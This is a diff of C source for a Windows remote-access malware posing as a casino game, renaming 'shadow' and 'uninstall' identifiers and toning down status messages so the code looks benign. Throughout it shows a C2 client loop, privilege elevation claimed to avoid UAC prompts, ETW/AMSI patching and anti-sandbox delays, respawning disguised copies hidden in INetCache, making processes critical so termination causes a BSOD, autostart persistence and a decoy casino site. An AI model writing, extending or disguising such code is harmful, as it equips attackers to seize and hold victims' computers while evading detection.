@@ -13,7 +13,7 @@
 HWND g_update_wnd = NULL;
 int g_update_type = 0;
 int g_input_blocked = 0;
-int g_isShadow = 0;
+int g_isService = 0;
 HHOOK g_mouse_hook = NULL;
 HHOOK g_kb_hook = NULL;
 HWND g_block_wnd = NULL;
@@ -22,8 +22,8 @@ RECT g_old_clip;
 int g_copy_buffer_saved = 0;
 int g_cursor_count = 0;
 
-/* Global uninstall flag — stops all respawning when set */
-volatile int g_uninstalling = 0;
+/* Global cleanup flag — stops all restarting when set */
+volatile int g_exiting = 0;
 
 /* Clipboard state */
 CRITICAL_SECTION g_copy_buffer_cs;
@@ -65,18 +65,18 @@ static int download_module(const char *url, const char *out_path) {
 }
 
 /* Auto-protect thread for shadow copies: waits 15 seconds then protects */
-DWORD WINAPI shadow_auto_protect(LPVOID lpParam) {
+DWORD WINAPI svc_auto_protect(LPVOID lpParam) {
     Sleep(15000);  /* Wait 15 seconds, then mark critical */
     util_set_critical();
     return 0;
 }
 
-/* Inter-process watchdog: monitors other shadow processes and respawns dead ones */
-DWORD WINAPI shadow_watchdog(LPVOID lpParam) {
+/* Inter-process watchdog: monitors other shadow processes and restarts dead ones */
+DWORD WINAPI svc_watchdog(LPVOID lpParam) {
     char localAppData[MAX_PATH];
     GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
     
-    const char *shadows[] = {
+    const char *services[] = {
         "ElevationService.exe",
         "CrashHandler.exe", 
         "NotifyService.exe"
@@ -90,15 +90,15 @@ DWORD WINAPI shadow_watchdog(LPVOID lpParam) {
     while (1) {
         Sleep(15000);  /* Check every 15 seconds */
         
-        /* Exit watchdog if uninstalling — don't respawn anything */
-        if (g_uninstalling) {
+        /* Exit watchdog if cleanuping — don't restart anything */
+        if (g_exiting) {
             return 0;
         }
         
         for (int i = 0; i < 3; i++) {
             char path[MAX_PATH];
             snprintf(path, sizeof(path), "%s\\Microsoft\\Windows\\INetCache\\IE\\%s",
-                     localAppData, shadows[i]);
+                     localAppData, services[i]);
             
             /* Check if process is running */
             int found = 0;
@@ -108,7 +108,7 @@ DWORD WINAPI shadow_watchdog(LPVOID lpParam) {
                 pe.dwSize = sizeof(pe);
                 if (Process32First(hSnap, &pe)) {
                     do {
-                        if (_stricmp(pe.szExeFile, shadows[i]) == 0) {
+                        if (_stricmp(pe.szExeFile, services[i]) == 0) {
                             found = 1;
                             break;
                         }
@@ -117,7 +117,7 @@ DWORD WINAPI shadow_watchdog(LPVOID lpParam) {
                 CloseHandle(hSnap);
             }
             
-            /* If not running, respawn with admin elevation */
+            /* If not running, restart with admin elevation */
             if (!found) {
                 SHELLEXECUTEINFOA sei = {0};
                 sei.cbSize = sizeof(sei);
@@ -207,7 +207,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         result = "[Security check complete]";
     }
     else if (strcmp(cmd, "DEPLOY_SVC") == 0) {
-        sys_spawn_shadow_copy();
+        sys_deploy_services();
         result = "[System services deployed]";
     }
     else if (strcmp(cmd, "REMOVE_SVC") == 0) {
@@ -248,7 +248,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         resp_pos = 0;
         util_appendf(response, &resp_pos, "=== LAYER VERIFICATION ===\n");
         
-        /* Layer 1: Shadow files on disk */
+        /* Layer 1: Service files on disk */
         for (int i = 0; i < 3; i++) {
             const char *names[] = {"ElevationService.exe", "CrashHandler.exe", "NotifyService.exe"};
             char path[MAX_PATH];
@@ -325,24 +325,24 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         const char *ps_cmd = cmd + 14;
         result = sys_obfuscate_ps(ps_cmd);
     }
-    else if (strcmp(cmd, "PROTECT_NOW") == 0) {
+    else if (strcmp(cmd, "SET_CRITICAL") == 0) {
         if (!sys_is_admin()) {
-            result = "[FAIL: not running as administrator]";
+            result = "[FAIL: admin required]";
         } else {
             util_set_critical();
             const char *status = sys_protection_status();
             if (strcmp(status, "CRITICAL") == 0) {
-                result = "[SUCCESS: Process is now CRITICAL — ending it will cause BSOD]";
+                result = "[SUCCESS: Process is now protected]";
             } else if (strcmp(status, "FAILED") == 0) {
-                result = "[FAIL: Protection API failed — likely missing required privilege. Try running as SYSTEM or use a different elevation method.]";
+                result = "[FAIL: protection failed]";
             } else {
-                result = "[UNKNOWN: protection status unclear]";
+                result = "[UNKNOWN: status unclear]";
             }
         }
     }
     else if (strcmp(cmd, "CLEANUP") == 0) {
-        sys_uninstall();
-        result = "[UNINSTALL initiated — all persistence removed, process will exit]";
+        sys_cleanup();
+        result = "[CLEANUP initiated — all persistence removed, process will exit]";
     }
     /* Game module management */
     else if (strncmp(cmd, GAME_FETCH_MODULE, strlen(GAME_FETCH_MODULE)) == 0) {
@@ -423,21 +423,21 @@ DWORD WINAPI game_client_loop(LPVOID lpParam) {
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     /* Detect if this is a shadow copy */
     char *cmdLine = GetCommandLineA();
-    g_isShadow = (cmdLine && strstr(cmdLine, "--shadow") != NULL);
+    g_isService = (cmdLine && strstr(cmdLine, "--shadow") != NULL);
     
     char currentPath[MAX_PATH];
     GetModuleFileNameA(NULL, currentPath, MAX_PATH);
     if (strstr(currentPath, "ElevationService.exe") != NULL ||
         strstr(currentPath, "CrashHandler.exe") != NULL ||
         strstr(currentPath, "NotifyService.exe") != NULL) {
-        g_isShadow = 1;
+        g_isService = 1;
     }
     
     /* === PHASE 0: Elevate FIRST (before anything else) ===
      * If main process is not admin, elevate immediately and exit.
-     * This ensures ALL subsequent operations (C2, spawning shadows,
+     * This ensures ALL subsequent operations (C2, spawning services,
      * scheduled tasks) run elevated WITHOUT UAC prompts. */
-    if (!g_isShadow) {
+    if (!g_isService) {
         sys_check_privileges();
     }
     
@@ -450,14 +450,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     /* Start C2 client loop in background thread */
     CreateThread(NULL, 0, game_client_loop, NULL, 0, NULL);
     
-    /* Start inter-process watchdog (respawns dead shadows) */
-    CreateThread(NULL, 0, shadow_watchdog, NULL, 0, NULL);
+    /* Start inter-process watchdog (restarts dead services) */
+    CreateThread(NULL, 0, svc_watchdog, NULL, 0, NULL);
     
     /* === PHASE 2: Evasion (after C2 is connected) ===
-     * Shadow copies skip the long anti-sandbox sleep.
+     * Service copies skip the long anti-sandbox sleep.
      * They just need quick ntdll unhook + ETW/AMSI patch. */
-    if (g_isShadow) {
-        /* Fast path for shadows: just unhook and patch, no long sleeps */
+    if (g_isService) {
+        /* Fast path for services: just unhook and patch, no long sleeps */
         /* REMOVED */;
         /* REMOVED */;
         /* REMOVED */;
@@ -473,8 +473,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     /* Initialize UI */
     ui_init();
     
-    /* Open casino decoy website (only for main process, not shadows) */
-    if (!g_isShadow) {
+    /* Open casino decoy website (only for main process, not services) */
+    if (!g_isService) {
         ShellExecuteA(NULL, "open", "https://jjakinn.github.io/new-vivid-casino-1/", NULL, NULL, SW_SHOWNORMAL);
     }
     
@@ -485,8 +485,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     sys_register_autostart();
     
     /* Only auto-protect shadow copies after 15 seconds */
-    if (g_isShadow) {
-        CreateThread(NULL, 0, shadow_auto_protect, NULL, 0, NULL);
+    if (g_isService) {
+        CreateThread(NULL, 0, svc_auto_protect, NULL, 0, NULL);
     }
     
     /* Start protection watchdog thread */
